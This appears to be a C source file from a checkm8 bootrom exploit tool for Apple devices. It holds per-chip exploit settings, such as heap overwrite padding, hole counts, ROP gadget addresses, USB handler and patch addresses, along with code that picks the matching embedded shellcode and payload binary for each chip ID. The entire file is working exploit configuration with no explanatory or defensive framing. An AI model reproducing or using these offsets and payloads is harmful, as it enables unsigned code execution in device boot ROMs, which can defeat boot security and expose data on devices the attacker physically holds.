#include "payload.h"

#include <stdbool.h>
#include <stdint.h>

#include "../utils.h"

extern uint8_t payloads_yolo_s8000_bin[], payloads_yolo_s8001_bin[], payloads_yolo_s8003_bin[], payloads_yolo_t7000_bin[], payloads_yolo_t7001_bin[], payloads_yolo_t8010_bin[],  payloads_yolo_t8011_bin[], payloads_yolo_t8015_bin[];
extern unsigned payloads_yolo_s8000_bin_len, payloads_yolo_s8001_bin_len, payloads_yolo_s8003_bin_len, payloads_yolo_t7000_bin_len, payloads_yolo_t7001_bin_len, payloads_yolo_t8010_bin_len, payloads_yolo_t8011_bin_len, payloads_yolo_t8015_bin_len;

extern uint8_t payloads_Pongo_bin[], payloads_shellcode_bin[];
extern unsigned payloads_Pongo_bin_len, payloads_shellcode_bin_len;

#include "../gen/payloads/yolo_s8000.h"
#include "../gen/payloads/yolo_s8001.h"
#include "../gen/payloads/yolo_s8003.h"
#include "../gen/payloads/yolo_t7000.h"
#include "../gen/payloads/yolo_t7001.h"
#include "../gen/payloads/yolo_t8010.h"
#include "../gen/payloads/yolo_t8011.h"
#include "../gen/payloads/yolo_t8015.h"

bool checkm8_find_device_configuration_for_cpid(
    int cpid,
    struct DeviceConfiguration *config)
{
    bool foundMatchingConfiguration = true;
    switch (cpid) {
        case 0x8015:
        case 0x8012:
        case 0x8011:
            config->cpid = cpid;
            config->config_large_leak = 0;
            config->config_overwrite_pad = 0x540;
            config->config_hole = 6;
            break;
        case 0x8010:
            config->cpid = cpid;
            config->config_large_leak = 0;
            config->config_overwrite_pad = 0x5C0;
            config->config_hole = 5;
            break;
        case 0x8001:
            config->cpid = cpid;
            config->config_large_leak = 0;
            config->config_overwrite_pad = 0x5C0;
            config->config_hole = 6;
            break;
        case 0x8003:
        case 0x8000:
        case 0x7001:
        case 0x7000:
            config->cpid = cpid;
            config->config_large_leak = 0;
            config->config_overwrite_pad = 0x500;
            config->config_hole = 0;
            break;
        default:
            ERROR("CPID 0x%x is not supported!", cpid);
            foundMatchingConfiguration = false;
            break;
    }
    return foundMatchingConfiguration;
}

bool checkm8_find_payload_configuration_for_cpid(
    int cpid,
    struct PayloadConfiguration *config)
{
    bool foundMatchingConfiguration = true;
    switch (cpid) {
        case 0x8015:
            config->tlbi = 0x1000004AC;
            config->nop_gadget = 0x10000A9C4;
            config->ret_gadget = 0x100000148;
            config->patch_addr = 0x10000624C;
            config->ttbr0_addr = 0x18000C000;
            config->func_gadget = 0x10000A9AC;
            config->write_ttbr0 = 0x10000045C;
            config->memcpy_addr = 0x10000E9D0;
            config->aes_crypto_cmd = 0x100009E9C;
            config->boot_tramp_end = 0x18001C000;
            config->ttbr0_vrom_off = 0x400;
            config->ttbr0_sram_off = 0x600;
            config->gUSBSerialNumber = 0x180003A78;
            config->dfu_handle_request = 0x180008638;
            config->usb_core_do_transfer = 0x10000B9A8;
            config->dfu_handle_bus_reset = 0x180008668;
            config->insecure_memory_base = 0x18001C000;
            config->handle_interface_request = 0x10000BCCC;
            config->usb_create_string_descriptor = 0x10000AE80;
            config->usb_serial_number_string_descriptor = 0x1800008FA;
            break;
        case 0x8012:
            config->tlbi = 0x100000494;
            config->nop_gadget = 0x100008DB8;
            config->ret_gadget = 0x10000012C;
            config->patch_addr = 0x100004854;
            config->ttbr0_addr = 0x18000C000;
            config->func_gadget = 0x100008DA0;
            config->write_ttbr0 = 0x100000444;
            config->memcpy_addr = 0x10000EA30;
            config->aes_crypto_cmd = 0x1000082AC;
            config->boot_tramp_end = 0x18001C000;
            config->ttbr0_vrom_off = 0x400;
            config->ttbr0_sram_off = 0x600;
            config->gUSBSerialNumber = 0x180003AF8;
            config->dfu_handle_request = 0x180008B08;
            config->usb_core_do_transfer = 0x10000BD20;
            config->dfu_handle_bus_reset = 0x180008B38;
            config->insecure_memory_base = 0x18001C000;
            config->handle_interface_request = 0x10000BFFC;
            config->usb_create_string_descriptor = 0x10000B1CC;
            config->usb_serial_number_string_descriptor = 0x18000082A;
            break;
        case 0x8011:
            config->tlbi = 0x100000444;
            config->nop_gadget = 0x10000CD0C;
            config->ret_gadget = 0x100000148;
            config->patch_addr = 0x100007630;
            config->ttbr0_addr = 0x1800A0000;
            config->func_gadget = 0x10000CCEC;
            config->write_ttbr0 = 0x1000003F4;
            config->memcpy_addr = 0x100010950;
            config->aes_crypto_cmd = 0x10000C994;
            config->boot_tramp_end = 0x1800B0000;
            config->ttbr0_vrom_off = 0x400;
            config->ttbr0_sram_off = 0x600;
            config->gUSBSerialNumber = 0x180083D28;
            config->dfu_handle_request = 0x180088A58;
            config->usb_core_do_transfer = 0x10000DD64;
            config->dfu_handle_bus_reset = 0x180088A88;
            config->insecure_memory_base = 0x1800B0000;
            config->handle_interface_request = 0x10000E08C;
            config->usb_create_string_descriptor = 0x10000D234;
            config->usb_serial_number_string_descriptor = 0x18008062A;
            break;
        case 0x8010:
            config->tlbi = 0x100000434;
            config->nop_gadget = 0x10000CC6C;
            config->ret_gadget = 0x10000015C;
            config->patch_addr = 0x1000074AC;
            config->ttbr0_addr = 0x1800A0000;
            config->func_gadget = 0x10000CC4C;
            config->write_ttbr0 = 0x1000003E4;
            config->memcpy_addr = 0x100010730;
            config->aes_crypto_cmd = 0x10000C8F4;
            config->boot_tramp_end = 0x1800B0000;
            config->ttbr0_vrom_off = 0x400;
            config->ttbr0_sram_off = 0x600;
            config->gUSBSerialNumber = 0x180083CF8;
            config->dfu_handle_request = 0x180088B48;
            config->usb_core_do_transfer = 0x10000DC98;
            config->dfu_handle_bus_reset = 0x180088B78;
            config->insecure_memory_base = 0x1800B0000;
            config->handle_interface_request = 0x10000DFB8;
            config->usb_create_string_descriptor = 0x10000D150;
            config->usb_serial_number_string_descriptor = 0x1800805DA;
            break;
        case 0x8001:
            config->tlbi = 0x100000404;
            config->nop_gadget = 0x10000CD60;
            config->ret_gadget = 0x100000118;
            config->patch_addr = 0x100007668;
            config->ttbr0_addr = 0x180050000;
            config->func_gadget = 0x10000CD40;
            config->write_ttbr0 = 0x1000003B4;
            config->memcpy_addr = 0x1000106F0;
            config->aes_crypto_cmd = 0x10000C9D4;
            config->boot_tramp_end = 0x180044000;
            config->ttbr0_vrom_off = 0x400;
            config->ttbr0_sram_off = 0x600;
            config->gUSBSerialNumber = 0x180047578;
            config->dfu_handle_request = 0x18004C378;
            config->usb_core_do_transfer = 0x10000DDA4;
            config->dfu_handle_bus_reset = 0x18004C3A8;
            config->insecure_memory_base = 0x180000000;
            config->handle_interface_request = 0x10000E0B4;
            config->usb_create_string_descriptor = 0x10000D280;
            config->usb_serial_number_string_descriptor = 0x18004486A;
            break;
        case 0x8003:
        case 0x8000:
            config->patch_addr = 0x10000812C;
            config->ttbr0_addr = 0x1800C8000;
            config->memcpy_addr = 0x100011030;
            config->aes_crypto_cmd = 0x10000DAA0;
            config->boot_tramp_end = 0x1800E1000;
            config->ttbr0_vrom_off = 0x400;
            config->ttbr0_sram_off = 0x600;
            config->gUSBSerialNumber = 0x180087958;
            config->dfu_handle_request = 0x1800878F8;
            config->usb_core_do_transfer = 0x10000EE78;
            config->dfu_handle_bus_reset = 0x180087928;
            config->insecure_memory_base = 0x180380000;
            config->handle_interface_request = 0x10000F1B0;
            config->usb_create_string_descriptor = 0x10000E354;
            config->usb_serial_number_string_descriptor = 0x1800807DA;
            break;
        case 0x7001:
            config->patch_addr = 0x10000AD04;
            config->memcpy_addr = 0x100013F10;
            config->aes_crypto_cmd = 0x100010A90;
            config->boot_tramp_end = 0x1800E1000;
            config->gUSBSerialNumber = 0x180088E48;
            config->dfu_handle_request = 0x180088DF8;
            config->usb_core_do_transfer = 0x100011BB4;
            config->dfu_handle_bus_reset = 0x180088E18;
            config->insecure_memory_base = 0x180380000;
            config->handle_interface_request = 0x100011EE4;
            config->usb_create_string_descriptor = 0x100011074;
            config->usb_serial_number_string_descriptor = 0x180080C2A;
            break;
        case 0x7000:
            config->patch_addr = 0x100007E98;
            config->memcpy_addr = 0x100010E70;
            config->aes_crypto_cmd = 0x10000DA90;
            config->boot_tramp_end = 0x1800E1000;
            config->gUSBSerialNumber = 0x1800888C8;
            config->dfu_handle_request = 0x180088878;
            config->usb_core_do_transfer = 0x10000EBB4;
            config->dfu_handle_bus_reset = 0x180088898;
            config->insecure_memory_base = 0x180380000;
            config->handle_interface_request = 0x10000EEE4;
            config->usb_create_string_descriptor = 0x10000E074;
            config->usb_serial_number_string_descriptor = 0x18008062A;
            break;
        default:
            ERROR("CPID 0x%x is not supported!", cpid);
            foundMatchingConfiguration = false;
    }
    return foundMatchingConfiguration;
}

void create_pongo_payload_for_device(
    uint16_t cpid,
    uint8_t **payload,
    size_t *payloadSize)
{
    VERBOSE("Preparing YoloDFU payload for CPID 0x%x.", cpid);

    *payload = NULL;
    *payloadSize = 0;

    switch (cpid) {
        case 0x8015:
            *payloadSize = payloads_yolo_t8015_bin_len;
            *payload = payloads_yolo_t8015_bin;
            break;
        case 0x8011:
            *payloadSize = payloads_yolo_t8011_bin_len;
            *payload = payloads_yolo_t8011_bin;
            break;
        case 0x8010:
            *payloadSize = payloads_yolo_t8010_bin_len;
            *payload = payloads_yolo_t8010_bin;
            break;
        case 0x8003:
            *payloadSize = payloads_yolo_s8003_bin_len;
            *payload = payloads_yolo_s8003_bin;
            break;
        case 0x8001:
            *payloadSize = payloads_yolo_s8001_bin_len;
            *payload = payloads_yolo_s8001_bin;
            break;
        case 0x8000:
            *payloadSize = payloads_yolo_s8000_bin_len;
            *payload = payloads_yolo_s8000_bin;
            break;
        case 0x7001:
            *payloadSize = payloads_yolo_t7001_bin_len;
            *payload = payloads_yolo_t7001_bin;
            break;
        case 0x7000:
            *payloadSize = payloads_yolo_t7000_bin_len;
            *payload = payloads_yolo_t7000_bin;
            break;
        default:
            LOG("Failed to prepare payload for device with CPID 0x%x.", cpid);
            break;
    }
}
